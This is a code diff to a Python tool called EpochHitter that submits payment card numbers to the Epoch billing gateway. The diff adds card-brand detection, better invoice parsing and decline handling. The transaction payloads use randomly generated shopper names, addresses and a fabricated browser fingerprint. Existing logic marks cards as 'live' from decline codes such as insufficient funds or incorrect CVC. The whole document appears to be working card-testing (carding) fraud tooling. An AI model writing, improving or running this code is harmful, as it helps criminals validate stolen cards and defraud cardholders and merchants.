@@ -70,6 +70,22 @@ def _generate_random_shopper(country_code: str = 'US') -> dict:
         'country': country_code or 'US'
     }
 
+def _detect_card_brand(card_num: str) -> str:
+    cn = str(card_num).strip()
+    if cn.startswith('4'):
+        return 'visa'
+    if cn.startswith(('51', '52', '53', '54', '55', '22', '23', '24', '25', '26', '27')):
+        return 'mastercard'
+    if cn.startswith(('34', '37')):
+        return 'amex'
+    if cn.startswith(('6011', '65', '644', '645')):
+        return 'discover'
+    if cn.startswith(('300', '301', '302', '303', '304', '305', '36', '38')):
+        return 'dinerscard'
+    if cn.startswith(('50', '58', '63', '67')):
+        return 'maestro'
+    return 'mastercard'
+
 class EpochHitter:
     """Epoch Billing & WNU Payment Gateway Engine."""
 
@@ -215,24 +231,26 @@ class EpochHitter:
                         purchases = inv_json.get('invoiceInfo', {}).get('purchases', [])
                         if purchases:
                             p0 = purchases[0]
-                            cfg['purchaseID'] = str(p0.get('purchase_id') or inv_json.get('invoiceInfo', {}).get('client_id') or "1")
-                            cfg['purchaseItemID'] = str(p0.get('purchase_item_id') or "1")
-                            cfg['siteID'] = str(p0.get('site_id') or "1")
-                            cfg['productCode'] = str(p0.get('product_id') or "1")
+                            cfg['purchaseID'] = str(p0.get('purchaseID') or p0.get('purchase_id') or inv_json.get('invoiceInfo', {}).get('client_id') or "1")
+                            cfg['purchaseItemID'] = str(p0.get('purchaseItemID') or p0.get('purchase_item_id') or "1")
+                            cfg['siteID'] = str(p0.get('siteId') or p0.get('site_id') or "1")
+                            cfg['productCode'] = str(p0.get('product_id') or p0.get('productCode') or "1")
                             site_name = p0.get('site') or inv_json.get('merchantInfo', {}).get('name')
                             if site_name:
                                 cfg['merchant'] = site_name.replace('www.', '').capitalize()
+                            customer = inv_json.get('invoiceInfo', {}).get('customer', {})
+                            if customer.get('email'):
+                                cfg['email'] = customer['email']
                             billing = p0.get('billing', {})
                             curr = billing.get('currency', 'USD')
+                            cfg['currency'] = curr
                             initial = billing.get('initial', {})
                             dollar_amt = initial.get('dollarAmount')
                             local_amt = initial.get('amount')
                             
                             if dollar_amt:
-                                cfg['currency'] = 'USD'
                                 cfg['amount'] = dollar_amt
                             elif local_amt:
-                                cfg['currency'] = curr
                                 cfg['amount'] = local_amt
             except Exception:
                 pass
@@ -257,6 +275,12 @@ class EpochHitter:
                 d = json.loads(trimmed)
                 if isinstance(d, list) and len(d) > 0:
                     item = d[0]
+                    redirect_params = str(item.get('redirectParams', ''))
+                    if 'ans=NDECLINED' in redirect_params or 'NDECLINED' in redirect_params:
+                        result['success'] = False
+                        result['decline_code'] = 'card_declined'
+                        result['error'] = 'Your payment was declined; please try again.'
+                        return result
                     if item.get('isApproved') is True or item.get('status') is True:
                         result['success'] = True
                         result['receipt_url'] = item.get('url') or item.get('receipt_url') or self.url
@@ -268,6 +292,12 @@ class EpochHitter:
                     result['is_live'] = err_code in ['insufficient_funds', 'incorrect_cvc', '3ds_required', 'restricted_card', 'issuer_unavailable']
                     return result
                 elif isinstance(d, dict):
+                    redirect_params = str(d.get('redirectParams', ''))
+                    if 'ans=NDECLINED' in redirect_params or 'NDECLINED' in redirect_params:
+                        result['success'] = False
+                        result['decline_code'] = 'card_declined'
+                        result['error'] = 'Your payment was declined; please try again.'
+                        return result
                     if d.get('isApproved') is True or d.get('status') is True or d.get('status') == 'Succeeded':
                         result['success'] = True
                         result['receipt_url'] = d.get('url') or d.get('receipt_url') or self.url
@@ -393,26 +423,27 @@ class EpochHitter:
                     c_key = cfg.get('cacheKey') or parse_qs(urlparse(self.url).query).get('cacheKey', [''])[0]
                     s_id = cfg.get('sessionID') or parse_qs(urlparse(self.url).query).get('sessionID', [''])[0]
                     visitor_id = hashlib.md5(f"{card['card']}_{time.time()}".encode()).hexdigest()
+                    brand = _detect_card_brand(card['card'])
                     
                     tx_payload = {
                         "cacheKey": c_key,
                         "sessionID": s_id,
-                        "invoiceID": cfg.get('invoiceID', c_key),
-                        "purchaseID": cfg.get('purchaseID', '1'),
-                        "purchaseItemID": cfg.get('purchaseItemID', '1'),
-                        "siteID": cfg.get('siteID', '1'),
-                        "productCode": cfg.get('productCode', '1'),
-                        "currencyCode": cfg.get('currency', 'USD'),
+                        "invoiceID": str(cfg.get('invoiceID', c_key)),
+                        "purchaseID": str(cfg.get('purchaseID', '1')),
+                        "purchaseItemID": str(cfg.get('purchaseItemID', '1')),
+                        "siteID": str(cfg.get('siteID', '1')),
+                        "productCode": str(cfg.get('productCode', '1')),
+                        "currencyCode": str(cfg.get('currency', 'USD')),
                         "countryCode": shopper.get('country', 'US'),
                         "fingerprintVisitorId": visitor_id,
                         "submitCount": max(1, attempt),
-                        "paymentType": "CreditDebitCard",
-                        "redirectType": "CreditDebitCard",
+                        "paymentType": brand,
+                        "redirectType": brand,
                         "fullName": shopper['full_name'],
                         "name_on_card": shopper['full_name'],
                         "first_name": shopper['first_name'],
                         "last_name": shopper['last_name'],
-                        "email": shopper['email'],
+                        "email": cfg.get('email') or shopper['email'],
                         "postalCode": shopper['postal_code'],
                         "zip": shopper['postal_code'],
                         "city": shopper['city'],
